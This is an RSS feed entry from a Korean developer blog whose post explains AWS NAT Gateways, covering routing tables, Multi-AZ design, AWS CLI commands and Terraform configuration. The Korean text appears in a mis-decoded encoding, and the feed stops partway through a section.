<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>ddanzit</title>
    <link>https://ckck803.github.io/</link>
    
    <atom:link href="https://ckck803.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>ê°œë°œ ë…¸íŠ¸</description>
    <pubDate>Sun, 28 Dec 2025 05:11:17 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[Network] NAT Gateway ë€?</title>
      <link>https://ckck803.github.io/2025/12/28/computer-science/network/nat-gateway/</link>
      <guid>https://ckck803.github.io/2025/12/28/computer-science/network/nat-gateway/</guid>
      <pubDate>Sun, 28 Dec 2025 14:00:00 GMT</pubDate>
      
      <description>&lt;h2 id=&quot;NAT-Gateway-ë€&quot;&gt;&lt;a href=&quot;#NAT-Gateway-ë€&quot; class=&quot;headerlink&quot; title=&quot;NAT Gateway ë€?&quot;&gt;&lt;/a&gt;NAT Gateway ë€?&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;NAT Gateway&lt;/strong&gt;ëŠ” Network Address Translationì˜ ì•½ìë¡œ, í”„ë¼ì´ë¹— ë„¤íŠ¸ì›Œí¬ì˜ ë¦¬ì†ŒìŠ¤ê°€ ì¸í„°ë„·ê³¼ í†µì‹ í•  ìˆ˜ ìˆë„ë¡ IP ì£¼ì†Œë¥¼ ë³€í™˜í•´ì£¼ëŠ” ê´€ë¦¬í˜• ë„¤íŠ¸ì›Œí¬ ì„œë¹„ìŠ¤ì…ë‹ˆë‹¤. ì£¼ë¡œ í”„ë¼ì´ë¹— ì„œë¸Œë„·ì˜ ì¸ìŠ¤í„´ìŠ¤ë“¤ì´ ì™¸ë¶€ ì¸í„°ë„·ì— ì ‘ê·¼í•  ìˆ˜ ìˆê²Œ í•˜ë©´ì„œë„, ì™¸ë¶€ì—ì„œ ì§ì ‘ì ì¸ ì¸ë°”ìš´ë“œ ì—°ê²°ì€ ì°¨ë‹¨í•˜ëŠ” ì—­í• ì„ í•©ë‹ˆë‹¤.&lt;/p&gt;
&lt;h2 id=&quot;NATì˜-ê¸°ë³¸-ê°œë…&quot;&gt;&lt;a href=&quot;#NATì˜-ê¸°ë³¸-ê°œë…&quot; class=&quot;headerlink&quot; title=&quot;NATì˜ ê¸°ë³¸ ê°œë…&quot;&gt;&lt;/a&gt;NATì˜ ê¸°ë³¸ ê°œë…&lt;/h2&gt;&lt;h3 id=&quot;NAT-Network-Address-Translation&quot;&gt;&lt;a href=&quot;#NAT-Network-Address-Translation&quot; class=&quot;headerlink&quot; title=&quot;NAT (Network Address Translation)&quot;&gt;&lt;/a&gt;NAT (Network Address Translation)&lt;/h3&gt;&lt;p&gt;NATëŠ” IP íŒ¨í‚·ì˜ ì†¡ì‹ ì§€ ë˜ëŠ” ëª©ì ì§€ IP ì£¼ì†Œë¥¼ ë³€í™˜í•˜ëŠ” ê¸°ìˆ ì…ë‹ˆë‹¤.&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;í”„ë¼ì´ë¹— IP â†’ NAT â†’ í¼ë¸”ë¦­ IP&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10.0.1.5    â†’ NAT â†’ 203.0.113.5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10.0.1.10   â†’ NAT â†’ 203.0.113.5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10.0.1.15   â†’ NAT â†’ 203.0.113.5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;NATê°€-í•„ìš”í•œ-ì´ìœ &quot;&gt;&lt;a href=&quot;#NATê°€-í•„ìš”í•œ-ì´ìœ &quot; class=&quot;headerlink&quot; title=&quot;NATê°€ í•„ìš”í•œ ì´ìœ &quot;&gt;&lt;/a&gt;NATê°€ í•„ìš”í•œ ì´ìœ &lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;IPv4 ì£¼ì†Œ ê³ ê°ˆ ë¬¸ì œ í•´ê²°&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ì œí•œëœ í¼ë¸”ë¦­ IP ì£¼ì†Œë¥¼ íš¨ìœ¨ì ìœ¼ë¡œ ì‚¬ìš©&lt;/li&gt;
&lt;li&gt;í•˜ë‚˜ì˜ í¼ë¸”ë¦­ IPë¡œ ì—¬ëŸ¬ í”„ë¼ì´ë¹— IP ë¦¬ì†ŒìŠ¤ ê´€ë¦¬&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;ë³´ì•ˆ ê°•í™”&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ë‚´ë¶€ ë„¤íŠ¸ì›Œí¬ êµ¬ì¡° ì€ë‹‰&lt;/li&gt;
&lt;li&gt;ì™¸ë¶€ì—ì„œ ì§ì ‘ ì ‘ê·¼ ì°¨ë‹¨&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;ìœ ì—°í•œ ë„¤íŠ¸ì›Œí¬ êµ¬ì„±&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ë‚´ë¶€ IP ì²´ê³„ë¥¼ ììœ ë¡­ê²Œ ì„¤ê³„&lt;/li&gt;
&lt;li&gt;ì™¸ë¶€ ë„¤íŠ¸ì›Œí¬ ë³€ê²½ ì‹œ ë‚´ë¶€ ì˜í–¥ ìµœì†Œí™”&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;NAT-Gateway-vs-NAT-Instance&quot;&gt;&lt;a href=&quot;#NAT-Gateway-vs-NAT-Instance&quot; class=&quot;headerlink&quot; title=&quot;NAT Gateway vs NAT Instance&quot;&gt;&lt;/a&gt;NAT Gateway vs NAT Instance&lt;/h2&gt;&lt;h3 id=&quot;NAT-Gateway&quot;&gt;&lt;a href=&quot;#NAT-Gateway&quot; class=&quot;headerlink&quot; title=&quot;NAT Gateway&quot;&gt;&lt;/a&gt;NAT Gateway&lt;/h3&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h2 id="NAT-Gateway-ë€"><a href="#NAT-Gateway-ë€" class="headerlink" title="NAT Gateway ë€?"></a>NAT Gateway ë€?</h2><p><strong>NAT Gateway</strong>ëŠ” Network Address Translationì˜ ì•½ìë¡œ, í”„ë¼ì´ë¹— ë„¤íŠ¸ì›Œí¬ì˜ ë¦¬ì†ŒìŠ¤ê°€ ì¸í„°ë„·ê³¼ í†µì‹ í•  ìˆ˜ ìˆë„ë¡ IP ì£¼ì†Œë¥¼ ë³€í™˜í•´ì£¼ëŠ” ê´€ë¦¬í˜• ë„¤íŠ¸ì›Œí¬ ì„œë¹„ìŠ¤ì…ë‹ˆë‹¤. ì£¼ë¡œ í”„ë¼ì´ë¹— ì„œë¸Œë„·ì˜ ì¸ìŠ¤í„´ìŠ¤ë“¤ì´ ì™¸ë¶€ ì¸í„°ë„·ì— ì ‘ê·¼í•  ìˆ˜ ìˆê²Œ í•˜ë©´ì„œë„, ì™¸ë¶€ì—ì„œ ì§ì ‘ì ì¸ ì¸ë°”ìš´ë“œ ì—°ê²°ì€ ì°¨ë‹¨í•˜ëŠ” ì—­í• ì„ í•©ë‹ˆë‹¤.</p><h2 id="NATì˜-ê¸°ë³¸-ê°œë…"><a href="#NATì˜-ê¸°ë³¸-ê°œë…" class="headerlink" title="NATì˜ ê¸°ë³¸ ê°œë…"></a>NATì˜ ê¸°ë³¸ ê°œë…</h2><h3 id="NAT-Network-Address-Translation"><a href="#NAT-Network-Address-Translation" class="headerlink" title="NAT (Network Address Translation)"></a>NAT (Network Address Translation)</h3><p>NATëŠ” IP íŒ¨í‚·ì˜ ì†¡ì‹ ì§€ ë˜ëŠ” ëª©ì ì§€ IP ì£¼ì†Œë¥¼ ë³€í™˜í•˜ëŠ” ê¸°ìˆ ì…ë‹ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">í”„ë¼ì´ë¹— IP â†’ NAT â†’ í¼ë¸”ë¦­ IP</span><br><span class="line">10.0.1.5    â†’ NAT â†’ 203.0.113.5</span><br><span class="line">10.0.1.10   â†’ NAT â†’ 203.0.113.5</span><br><span class="line">10.0.1.15   â†’ NAT â†’ 203.0.113.5</span><br></pre></td></tr></table></figure><h3 id="NATê°€-í•„ìš”í•œ-ì´ìœ "><a href="#NATê°€-í•„ìš”í•œ-ì´ìœ " class="headerlink" title="NATê°€ í•„ìš”í•œ ì´ìœ "></a>NATê°€ í•„ìš”í•œ ì´ìœ </h3><ol><li><p><strong>IPv4 ì£¼ì†Œ ê³ ê°ˆ ë¬¸ì œ í•´ê²°</strong></p><ul><li>ì œí•œëœ í¼ë¸”ë¦­ IP ì£¼ì†Œë¥¼ íš¨ìœ¨ì ìœ¼ë¡œ ì‚¬ìš©</li><li>í•˜ë‚˜ì˜ í¼ë¸”ë¦­ IPë¡œ ì—¬ëŸ¬ í”„ë¼ì´ë¹— IP ë¦¬ì†ŒìŠ¤ ê´€ë¦¬</li></ul></li><li><p><strong>ë³´ì•ˆ ê°•í™”</strong></p><ul><li>ë‚´ë¶€ ë„¤íŠ¸ì›Œí¬ êµ¬ì¡° ì€ë‹‰</li><li>ì™¸ë¶€ì—ì„œ ì§ì ‘ ì ‘ê·¼ ì°¨ë‹¨</li></ul></li><li><p><strong>ìœ ì—°í•œ ë„¤íŠ¸ì›Œí¬ êµ¬ì„±</strong></p><ul><li>ë‚´ë¶€ IP ì²´ê³„ë¥¼ ììœ ë¡­ê²Œ ì„¤ê³„</li><li>ì™¸ë¶€ ë„¤íŠ¸ì›Œí¬ ë³€ê²½ ì‹œ ë‚´ë¶€ ì˜í–¥ ìµœì†Œí™”</li></ul></li></ol><h2 id="NAT-Gateway-vs-NAT-Instance"><a href="#NAT-Gateway-vs-NAT-Instance" class="headerlink" title="NAT Gateway vs NAT Instance"></a>NAT Gateway vs NAT Instance</h2><h3 id="NAT-Gateway"><a href="#NAT-Gateway" class="headerlink" title="NAT Gateway"></a>NAT Gateway</h3><p>AWS, GCP ë“± í´ë¼ìš°ë“œ ì œê³µì—…ì²´ê°€ ê´€ë¦¬í•˜ëŠ” ê´€ë¦¬í˜• ì„œë¹„ìŠ¤</p><p><strong>ì¥ì :</strong></p><ul><li>ë†’ì€ ê°€ìš©ì„± (ìë™ ì´ì¤‘í™”)</li><li>ìë™ í™•ì¥ (ìµœëŒ€ 45Gbps)</li><li>ê´€ë¦¬ ë¶€ë‹´ ì—†ìŒ</li><li>ë³´ì•ˆ ê·¸ë£¹ ë¶ˆí•„ìš”</li></ul><p><strong>ë‹¨ì :</strong></p><ul><li>ì‹œê°„ë‹¹ ê³¼ê¸ˆ</li><li>ë°ì´í„° ì „ì†¡ëŸ‰ ê³¼ê¸ˆ</li><li>ë³´ì•ˆ ê·¸ë£¹ ë¯¸ì§€ì›</li><li>Bastion Hostë¡œ ì‚¬ìš© ë¶ˆê°€</li></ul><h3 id="NAT-Instance"><a href="#NAT-Instance" class="headerlink" title="NAT Instance"></a>NAT Instance</h3><p>ì‚¬ìš©ìê°€ ì§ì ‘ ê´€ë¦¬í•˜ëŠ” EC2 ì¸ìŠ¤í„´ìŠ¤</p><p><strong>ì¥ì :</strong></p><ul><li>ë¹„ìš© ì ˆê° ê°€ëŠ¥ (ì†Œê·œëª¨ì˜ ê²½ìš°)</li><li>ë³´ì•ˆ ê·¸ë£¹ ì‚¬ìš© ê°€ëŠ¥</li><li>Bastion Hostë¡œ í™œìš© ê°€ëŠ¥</li><li>ì»¤ìŠ¤í„°ë§ˆì´ì§• ê°€ëŠ¥</li></ul><p><strong>ë‹¨ì :</strong></p><ul><li>ê´€ë¦¬ ë¶€ë‹´ (íŒ¨ì¹˜, ì—…ë°ì´íŠ¸)</li><li>ê°€ìš©ì„± ì§ì ‘ ê´€ë¦¬ í•„ìš”</li><li>ì„±ëŠ¥ ì œí•œ (ì¸ìŠ¤í„´ìŠ¤ íƒ€ì…ì— ë”°ë¼)</li><li>Single Point of Failure ìœ„í—˜</li></ul><h2 id="AWS-NAT-Gateway-ì•„í‚¤í…ì²˜"><a href="#AWS-NAT-Gateway-ì•„í‚¤í…ì²˜" class="headerlink" title="AWS NAT Gateway ì•„í‚¤í…ì²˜"></a>AWS NAT Gateway ì•„í‚¤í…ì²˜</h2><h3 id="ê¸°ë³¸-êµ¬ì„±"><a href="#ê¸°ë³¸-êµ¬ì„±" class="headerlink" title="ê¸°ë³¸ êµ¬ì„±"></a>ê¸°ë³¸ êµ¬ì„±</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="line">â”‚                  VPC (10.0.0.0/16)              â”‚</span><br><span class="line">â”‚                                                 â”‚</span><br><span class="line">â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚</span><br><span class="line">â”‚  â”‚ Public Subnet      â”‚  â”‚ Private Subnet   â”‚  â”‚</span><br><span class="line">â”‚  â”‚ (10.0.1.0/24)      â”‚  â”‚ (10.0.2.0/24)    â”‚  â”‚</span><br><span class="line">â”‚  â”‚                    â”‚  â”‚                  â”‚  â”‚</span><br><span class="line">â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚  â”‚</span><br><span class="line">â”‚  â”‚  â”‚ NAT Gateway  â”‚  â”‚  â”‚  â”‚  Instance  â”‚  â”‚  â”‚</span><br><span class="line">â”‚  â”‚  â”‚ (Public IP)  â”‚â—„â”€â”¼â”€â”€â”¼â”€â”€â”‚ (Private)  â”‚  â”‚  â”‚</span><br><span class="line">â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚  â”‚</span><br><span class="line">â”‚  â”‚         â”‚          â”‚  â”‚                  â”‚  â”‚</span><br><span class="line">â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚</span><br><span class="line">â”‚            â”‚                                    â”‚</span><br><span class="line">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br><span class="line">             â”‚</span><br><span class="line">             â–¼</span><br><span class="line">    Internet Gateway</span><br><span class="line">             â”‚</span><br><span class="line">             â–¼</span><br><span class="line">         Internet</span><br></pre></td></tr></table></figure><h3 id="ë¼ìš°íŒ…-í…Œì´ë¸”-êµ¬ì„±"><a href="#ë¼ìš°íŒ…-í…Œì´ë¸”-êµ¬ì„±" class="headerlink" title="ë¼ìš°íŒ… í…Œì´ë¸” êµ¬ì„±"></a>ë¼ìš°íŒ… í…Œì´ë¸” êµ¬ì„±</h3><p><strong>Public Subnet ë¼ìš°íŒ… í…Œì´ë¸”:</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Destination       Target</span><br><span class="line">10.0.0.0/16      local</span><br><span class="line">0.0.0.0/0        igw-xxxxx (Internet Gateway)</span><br></pre></td></tr></table></figure><p><strong>Private Subnet ë¼ìš°íŒ… í…Œì´ë¸”:</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Destination       Target</span><br><span class="line">10.0.0.0/16      local</span><br><span class="line">0.0.0.0/0        nat-xxxxx (NAT Gateway)</span><br></pre></td></tr></table></figure><h2 id="NAT-Gateway-ë™ì‘-ë°©ì‹"><a href="#NAT-Gateway-ë™ì‘-ë°©ì‹" class="headerlink" title="NAT Gateway ë™ì‘ ë°©ì‹"></a>NAT Gateway ë™ì‘ ë°©ì‹</h2><h3 id="ì•„ì›ƒë°”ìš´ë“œ-íŠ¸ë˜í”½-íë¦„"><a href="#ì•„ì›ƒë°”ìš´ë“œ-íŠ¸ë˜í”½-íë¦„" class="headerlink" title="ì•„ì›ƒë°”ìš´ë“œ íŠ¸ë˜í”½ íë¦„"></a>ì•„ì›ƒë°”ìš´ë“œ íŠ¸ë˜í”½ íë¦„</h3><ol><li><strong>í”„ë¼ì´ë¹— ì¸ìŠ¤í„´ìŠ¤ â†’ ì¸í„°ë„·</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. Private Instance (10.0.2.10) â†’ ì™¸ë¶€ ì„œë²„ (93.184.216.34)</span><br><span class="line">   Source: 10.0.2.10:50000</span><br><span class="line">   Dest: 93.184.216.34:443</span><br><span class="line"></span><br><span class="line">2. NAT Gatewayì—ì„œ ì£¼ì†Œ ë³€í™˜</span><br><span class="line">   Source: 52.1.2.3:10000 (NAT Gateway Public IP)</span><br><span class="line">   Dest: 93.184.216.34:443</span><br><span class="line"></span><br><span class="line">3. ì™¸ë¶€ ì„œë²„ë¡œ ì „ì†¡</span><br><span class="line"></span><br><span class="line">4. ì‘ë‹µ ìˆ˜ì‹ </span><br><span class="line">   Source: 93.184.216.34:443</span><br><span class="line">   Dest: 52.1.2.3:10000</span><br><span class="line"></span><br><span class="line">5. NAT Gatewayì—ì„œ ì—­ë³€í™˜</span><br><span class="line">   Source: 93.184.216.34:443</span><br><span class="line">   Dest: 10.0.2.10:50000</span><br><span class="line"></span><br><span class="line">6. Private Instanceë¡œ ì „ë‹¬</span><br></pre></td></tr></table></figure></li></ol><h3 id="ì¸ë°”ìš´ë“œ-íŠ¸ë˜í”½-ì°¨ë‹¨"><a href="#ì¸ë°”ìš´ë“œ-íŠ¸ë˜í”½-ì°¨ë‹¨" class="headerlink" title="ì¸ë°”ìš´ë“œ íŠ¸ë˜í”½ ì°¨ë‹¨"></a>ì¸ë°”ìš´ë“œ íŠ¸ë˜í”½ ì°¨ë‹¨</h3><p>NAT GatewayëŠ” ì•„ì›ƒë°”ìš´ë“œ ì—°ê²°ë§Œ í—ˆìš©í•˜ê³ , ì™¸ë¶€ì—ì„œ ì‹œì‘ë˜ëŠ” ì¸ë°”ìš´ë“œ ì—°ê²°ì€ ìë™ìœ¼ë¡œ ì°¨ë‹¨ë©ë‹ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">âŒ Internet â†’ NAT Gateway â†’ Private Instance (ë¶ˆê°€ëŠ¥)</span><br><span class="line">âœ… Private Instance â†’ NAT Gateway â†’ Internet (ê°€ëŠ¥)</span><br></pre></td></tr></table></figure><h2 id="NAT-Gateway-ê³ ê°€ìš©ì„±-êµ¬ì„±"><a href="#NAT-Gateway-ê³ ê°€ìš©ì„±-êµ¬ì„±" class="headerlink" title="NAT Gateway ê³ ê°€ìš©ì„± êµ¬ì„±"></a>NAT Gateway ê³ ê°€ìš©ì„± êµ¬ì„±</h2><h3 id="Multi-AZ-êµ¬ì„±"><a href="#Multi-AZ-êµ¬ì„±" class="headerlink" title="Multi-AZ êµ¬ì„±"></a>Multi-AZ êµ¬ì„±</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="line">â”‚                    VPC                              â”‚</span><br><span class="line">â”‚                                                     â”‚</span><br><span class="line">â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚</span><br><span class="line">â”‚  â”‚  AZ-A            â”‚      â”‚  AZ-B            â”‚    â”‚</span><br><span class="line">â”‚  â”‚                  â”‚      â”‚                  â”‚    â”‚</span><br><span class="line">â”‚  â”‚  Public Subnet   â”‚      â”‚  Public Subnet   â”‚    â”‚</span><br><span class="line">â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚      â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚    â”‚</span><br><span class="line">â”‚  â”‚  â”‚NAT Gateway â”‚  â”‚      â”‚  â”‚NAT Gateway â”‚  â”‚    â”‚</span><br><span class="line">â”‚  â”‚  â”‚     A      â”‚  â”‚      â”‚  â”‚     B      â”‚  â”‚    â”‚</span><br><span class="line">â”‚  â”‚  â””â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜  â”‚      â”‚  â””â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜  â”‚    â”‚</span><br><span class="line">â”‚  â”‚        â”‚         â”‚      â”‚        â”‚         â”‚    â”‚</span><br><span class="line">â”‚  â”‚ Private Subnet   â”‚      â”‚ Private Subnet   â”‚    â”‚</span><br><span class="line">â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚      â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚    â”‚</span><br><span class="line">â”‚  â”‚  â”‚Instance  â”‚â”€â”€â”€â”€â”¼â”€â”€â”   â”‚  â”‚Instance  â”‚    â”‚    â”‚</span><br><span class="line">â”‚  â”‚  â”‚    A     â”‚    â”‚  â”‚   â”‚  â”‚    B     â”‚â”€â”€â”€â”€â”¼â”€â”€â” â”‚</span><br><span class="line">â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚  â”‚   â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚  â”‚ â”‚</span><br><span class="line">â”‚  â”‚                  â”‚  â”‚   â”‚                  â”‚  â”‚ â”‚</span><br><span class="line">â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚ â”‚</span><br><span class="line">â”‚                        â”‚                         â”‚ â”‚</span><br><span class="line">â”‚       ë¼ìš°íŒ…: NAT-A â”€â”€â”€â”˜         ë¼ìš°íŒ…: NAT-B â”€â”€â”€â”˜ â”‚</span><br><span class="line">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br></pre></td></tr></table></figure><p>ê° ê°€ìš© ì˜ì—­(AZ)ë§ˆë‹¤ NAT Gatewayë¥¼ ë°°ì¹˜í•˜ì—¬ ê³ ê°€ìš©ì„±ì„ í™•ë³´í•©ë‹ˆë‹¤.</p><h2 id="NAT-Gateway-ì„¤ì •-AWS-ì˜ˆì‹œ"><a href="#NAT-Gateway-ì„¤ì •-AWS-ì˜ˆì‹œ" class="headerlink" title="NAT Gateway ì„¤ì • (AWS ì˜ˆì‹œ)"></a>NAT Gateway ì„¤ì • (AWS ì˜ˆì‹œ)</h2><h3 id="1-NAT-Gateway-ìƒì„±"><a href="#1-NAT-Gateway-ìƒì„±" class="headerlink" title="1. NAT Gateway ìƒì„±"></a>1. NAT Gateway ìƒì„±</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># AWS CLIë¥¼ í†µí•œ NAT Gateway ìƒì„±</span></span><br><span class="line">aws ec2 create-nat-gateway \</span><br><span class="line">    --subnet-id subnet-1234567890abcdef0 \</span><br><span class="line">    --allocation-id eipalloc-1234567890abcdef0</span><br></pre></td></tr></table></figure><h3 id="2-ë¼ìš°íŒ…-í…Œì´ë¸”-ì„¤ì •"><a href="#2-ë¼ìš°íŒ…-í…Œì´ë¸”-ì„¤ì •" class="headerlink" title="2. ë¼ìš°íŒ… í…Œì´ë¸” ì„¤ì •"></a>2. ë¼ìš°íŒ… í…Œì´ë¸” ì„¤ì •</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ë¼ìš°íŒ… í…Œì´ë¸” ìƒì„±</span></span><br><span class="line">aws ec2 create-route-table \</span><br><span class="line">    --vpc-id vpc-1234567890abcdef0</span><br><span class="line"></span><br><span class="line"><span class="comment"># NAT Gatewayë¡œ ê°€ëŠ” ë¼ìš°íŠ¸ ì¶”ê°€</span></span><br><span class="line">aws ec2 create-route \</span><br><span class="line">    --route-table-id rtb-1234567890abcdef0 \</span><br><span class="line">    --destination-cidr-block 0.0.0.0/0 \</span><br><span class="line">    --nat-gateway-id nat-1234567890abcdef0</span><br><span class="line"></span><br><span class="line"><span class="comment"># í”„ë¼ì´ë¹— ì„œë¸Œë„·ê³¼ ë¼ìš°íŒ… í…Œì´ë¸” ì—°ê²°</span></span><br><span class="line">aws ec2 associate-route-table \</span><br><span class="line">    --route-table-id rtb-1234567890abcdef0 \</span><br><span class="line">    --subnet-id subnet-0987654321fedcba0</span><br></pre></td></tr></table></figure><h3 id="3-Terraform-ì„¤ì •-ì˜ˆì‹œ"><a href="#3-Terraform-ì„¤ì •-ì˜ˆì‹œ" class="headerlink" title="3. Terraform ì„¤ì • ì˜ˆì‹œ"></a>3. Terraform ì„¤ì • ì˜ˆì‹œ</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Elastic IP ìƒì„±</span><br><span class="line">resource &quot;aws_eip&quot; &quot;nat&quot; &#123;</span><br><span class="line">  vpc = true</span><br><span class="line"></span><br><span class="line">  tags = &#123;</span><br><span class="line">    Name = &quot;nat-gateway-eip&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># NAT Gateway ìƒì„±</span><br><span class="line">resource &quot;aws_nat_gateway&quot; &quot;main&quot; &#123;</span><br><span class="line">  allocation_id = aws_eip.nat.id</span><br><span class="line">  subnet_id     = aws_subnet.public.id</span><br><span class="line"></span><br><span class="line">  tags = &#123;</span><br><span class="line">    Name = &quot;main-nat-gateway&quot;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  # Internet Gatewayê°€ ë¨¼ì € ìƒì„±ë˜ì–´ì•¼ í•¨</span><br><span class="line">  depends_on = [aws_internet_gateway.main]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># Private ì„œë¸Œë„· ë¼ìš°íŒ… í…Œì´ë¸”</span><br><span class="line">resource &quot;aws_route_table&quot; &quot;private&quot; &#123;</span><br><span class="line">  vpc_id = aws_vpc.main.id</span><br><span class="line"></span><br><span class="line">  route &#123;</span><br><span class="line">    cidr_block     = &quot;0.0.0.0/0&quot;</span><br><span class="line">    nat_gateway_id = aws_nat_gateway.main.id</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  tags = &#123;</span><br><span class="line">    Name = &quot;private-route-table&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># ë¼ìš°íŒ… í…Œì´ë¸” ì—°ê²°</span><br><span class="line">resource &quot;aws_route_table_association&quot; &quot;private&quot; &#123;</span><br><span class="line">  subnet_id      = aws_subnet.private.id</span><br><span class="line">  route_table_id = aws_route_table.private.id</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="NAT-Gateway-ì‚¬ìš©-ì‚¬ë¡€"><a href="#NAT-Gateway-ì‚¬ìš©-ì‚¬ë¡€" class="headerlink" title="NAT Gateway ì‚¬ìš© ì‚¬ë¡€"></a>NAT Gateway ì‚¬ìš© ì‚¬ë¡€</h2><h3 id="1-ë°ì´í„°ë² ì´ìŠ¤-ì„œë²„ì˜-ì™¸ë¶€-í†µì‹ "><a href="#1-ë°ì´í„°ë² ì´ìŠ¤-ì„œë²„ì˜-ì™¸ë¶€-í†µì‹ " class="headerlink" title="1. ë°ì´í„°ë² ì´ìŠ¤ ì„œë²„ì˜ ì™¸ë¶€ í†µì‹ "></a>1. ë°ì´í„°ë² ì´ìŠ¤ ì„œë²„ì˜ ì™¸ë¶€ í†µì‹ </h3><figure class="highlight plaintext"><table><tr><td 